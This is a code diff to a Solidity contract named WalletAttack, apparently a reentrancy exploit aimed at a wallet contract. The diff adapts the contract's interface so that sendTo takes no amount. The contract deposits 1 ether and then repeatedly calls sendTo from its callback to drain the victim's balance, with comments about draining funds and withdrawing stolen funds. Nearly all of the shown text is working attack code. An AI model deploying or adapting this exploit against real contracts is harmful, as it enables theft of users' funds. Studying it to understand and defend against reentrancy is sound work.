@@ -1,19 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
-interface IWallet2 {
+interface IWallet {
     function deposit() external payable;
-    function sendTo(address payable destination, uint amount) external;
+    function sendTo(address payable destination) external;
 }
 
 contract WalletAttack {
-    IWallet2 public wallet;
+    IWallet public wallet;
     address public owner;
     uint256 public constant ATTACK_AMOUNT = 1 ether;
     uint256 public constant VICTIM_THRESHOLD = 3 ether;
 
     constructor(address _walletAddress) {
-        wallet = IWallet2(_walletAddress);
+        wallet = IWallet(_walletAddress);
         owner = msg.sender;
     }
 
@@ -22,8 +22,7 @@ contract WalletAttack {
         // Try to drain more funds if possible
         uint256 balance = address(wallet).balance;
         if (balance > 0) {
-            uint256 withdrawAmount = balance > ATTACK_AMOUNT ? ATTACK_AMOUNT : balance;
-            wallet.sendTo(payable(address(this)), withdrawAmount);
+            wallet.sendTo(payable(address(this)));
         }
     }
 
@@ -36,7 +35,7 @@ contract WalletAttack {
         wallet.deposit{value: ATTACK_AMOUNT}();
         
         // Initiate the first withdrawal
-        wallet.sendTo(payable(address(this)), ATTACK_AMOUNT);
+        wallet.sendTo(payable(address(this)));
     }
 
     // Withdraw stolen funds
